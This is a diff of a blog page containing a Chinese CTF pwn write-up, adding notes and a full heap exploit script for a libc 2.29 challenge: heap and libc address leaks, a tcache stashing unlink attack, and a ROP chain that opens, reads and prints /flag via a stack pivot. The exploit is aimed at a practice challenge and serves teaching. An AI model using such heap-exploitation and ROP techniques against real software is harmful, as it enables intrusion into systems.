@@ -50,7 +50,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20201022134326903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjEzNTA4Nw==,size_16,color_FFFFFF,t_70#pic_center">
 <meta property="og:image" content="https://junyu33.me/2032/02/07/bin_ctf/730251_VSKG4X24337JH42.jpg">
 <meta property="article:published_time" content="2032-02-07T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-10-05T04:21:39.163Z">
+<meta property="article:modified_time" content="2022-10-05T04:48:40.597Z">
 <meta property="article:author" content="丨junyu33丨">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -245,7 +245,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -378,7 +378,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-10-05 12:21:39" itemprop="dateModified" datetime="2022-10-05T12:21:39+08:00">2022-10-05</time>
+        <time title="修改时间：2022-10-05 12:48:40" itemprop="dateModified" datetime="2022-10-05T12:48:40+08:00">2022-10-05</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -873,7 +873,9 @@
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198173?display=mobile#h3-3">https://www.anquanke.com/post/id/198173?display=mobile#h3-3</a></p>
 </blockquote>
+<p>题目的要求是想让在一个指定位置写一个大于<code>0x7f0000000000</code>的值，但是libc2.29对<code>unsortedbin</code>做出了更多限制，因此<code>unsortedbin attack</code>失效。</p>
 <p>由于程序使用calloc分配内存，所以不能使用<code>tcache poisoning</code>的方式写<code>malloc_hook</code>等区域的值。但calloc恰好又是使用<code>tcache stashing unlink attack</code>的必需条件，正所谓“上帝关了一扇门 必定会再为你打开另一扇窗”。</p>
+<p>之后使用<code>rop</code>方式<code>orw</code>读取<code>flag</code>即可。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   [[add(<span class="number">15</span>, <span class="number">4</span>, <span class="string">&#x27;chunk15\0&#x27;</span>*<span class="number">4</span>), dele(<span class="number">15</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">   [[add(<span class="number">14</span>, <span class="number">2</span>, <span class="string">&#x27;chunk14\0&#x27;</span>*<span class="number">4</span>), dele(<span class="number">14</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">   show(<span class="number">15</span>)</span><br><span class="line">   heap_base = u64(io.recvline()[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x26c0</span></span><br><span class="line">   log.info(<span class="string">&#x27;heap_base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">   </span><br><span class="line">   add(<span class="number">1</span>, <span class="number">4</span>, <span class="string">&#x27;chunk1\0&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">   add(<span class="number">13</span>, <span class="number">4</span>, <span class="string">&#x27;chunk13\0&#x27;</span>*<span class="number">4</span>) <span class="comment"># avoid consolidate with top chunk</span></span><br><span class="line">   dele(<span class="number">1</span>)</span><br><span class="line">   show(<span class="number">1</span>)</span><br><span class="line">   libc_base = u64(io.recvline()[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">   log.info(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">   <span class="comment"># now the 0x410 tcachebin is full, and the 0x100 tcachebin has 6 chunks</span></span><br><span class="line"></span><br><span class="line">   add(<span class="number">13</span>, <span class="number">3</span>, <span class="string">&#x27;chunk13\0&#x27;</span>*<span class="number">4</span>) <span class="comment"># 0x410 - 0x310 = 0x100 unsortedbin</span></span><br><span class="line">   add(<span class="number">13</span>, <span class="number">3</span>, <span class="string">&#x27;chunk13\0&#x27;</span>*<span class="number">4</span>) <span class="comment"># 0x310 &gt; 0x100, so it will be put into 0x100 smallbin</span></span><br><span class="line">   <span class="comment"># the 0x410 unsortedbin turns to 0x100 smallbin</span></span><br><span class="line"></span><br><span class="line">   add(<span class="number">2</span>, <span class="number">4</span>, <span class="string">&#x27;chunk2\0&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">   add(<span class="number">13</span>, <span class="number">4</span>, <span class="string">&#x27;chunk13\0&#x27;</span>*<span class="number">2</span>) <span class="comment"># avoid consolidate with top chunk</span></span><br><span class="line">   dele(<span class="number">2</span>)</span><br><span class="line">   add(<span class="number">13</span>, <span class="number">3</span>, <span class="string">&#x27;chunk13\0&#x27;</span>*<span class="number">4</span>) <span class="comment"># again</span></span><br><span class="line">   add(<span class="number">13</span>, <span class="number">3</span>, <span class="string">&#x27;chunk13\0&#x27;</span>*<span class="number">4</span>) </span><br><span class="line">   <span class="comment"># another 0x100 smallbin, now smallbin: chunk2 -&gt; chunk1</span></span><br><span class="line">   payload = <span class="string">b&#x27;0&#x27;</span>*<span class="number">0x300</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(heap_base+<span class="number">0x37e0</span>)+p64(heap_base+<span class="number">0x250</span>+<span class="number">0x10</span>+<span class="number">0x800</span>-<span class="number">0x10</span>)</span><br><span class="line">   edit(<span class="number">2</span>, payload)</span><br><span class="line">   add(<span class="number">3</span>, <span class="number">2</span>, <span class="string">&#x27;chunk3\0&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">   <span class="comment"># tcache stashing unlink attack -&gt; write main_arena on chunk2&#x27;s bk address</span></span><br><span class="line">   pop_rdi_ret = libc_base + <span class="number">0x0000000000026542</span></span><br><span class="line">   pop_rsi_ret = libc_base + <span class="number">0x0000000000026f9e</span></span><br><span class="line">   pop_rdx_ret = libc_base + <span class="number">0x000000000012bda6</span></span><br><span class="line">   leave_ret = libc_base + <span class="number">0x0000000000058373</span></span><br><span class="line">   file_name_addr = heap_base + <span class="number">0x0000000000004b40</span></span><br><span class="line">   flag_addr = file_name_addr + <span class="number">0x0000000000000200</span></span><br><span class="line">   orw  = <span class="string">b&#x27;/flag\0\0\0&#x27;</span></span><br><span class="line">   orw += p64(pop_rdi_ret)</span><br><span class="line">   orw += p64(file_name_addr)</span><br><span class="line">   orw += p64(pop_rsi_ret)</span><br><span class="line">   orw += p64(<span class="number">0</span>) <span class="comment"># 0 is stdin, 1 is stdout, 2 is stderr</span></span><br><span class="line">   orw += p64(libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">   orw += p64(pop_rdi_ret)</span><br><span class="line">   orw += p64(<span class="number">3</span>) <span class="comment"># 3 and so on is for new file descriptor</span></span><br><span class="line">   orw += p64(pop_rsi_ret)</span><br><span class="line">   orw += p64(flag_addr)</span><br><span class="line">   orw += p64(pop_rdx_ret)</span><br><span class="line">   orw += p64(<span class="number">0x40</span>)</span><br><span class="line">   orw += p64(libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">   orw += p64(pop_rdi_ret)</span><br><span class="line">   orw += p64(<span class="number">1</span>)</span><br><span class="line">   orw += p64(pop_rsi_ret)</span><br><span class="line">   orw += p64(flag_addr)</span><br><span class="line">   orw += p64(pop_rdx_ret)</span><br><span class="line">   orw += p64(<span class="number">0x40</span>)</span><br><span class="line">   orw += p64(libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">   add(<span class="number">4</span>, <span class="number">4</span>, orw)</span><br><span class="line">   io.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">   io.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">   io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(file_name_addr) + p64(leave_ret))</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>彩蛋：</p>
@@ -1021,8 +1023,8 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/09/26/%E5%A4%A7%E7%89%A9%E7%AC%94%E8%AE%B0.html" rel="prev" title="（不定期更新）大物上笔记">
-                  <i class="fa fa-chevron-left"></i> （不定期更新）大物上笔记
+                <a href="/2022/10/05/%E5%AD%90%E6%96%87%E7%95%A5%E7%95%A5%E7%95%A5%E9%A2%98%E8%A7%A3.html" rel="prev" title="子文略略略题解">
+                  <i class="fa fa-chevron-left"></i> 子文略略略题解
                 </a>
             </div>
             <div class="post-nav-item">
@@ -1083,13 +1085,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">317k</span>
+    <span title="站点总字数">318k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:48</span>
+    <span title="站点阅读时长">4:49</span>
   </span>
 </div>
 <div class="busuanzi-count">
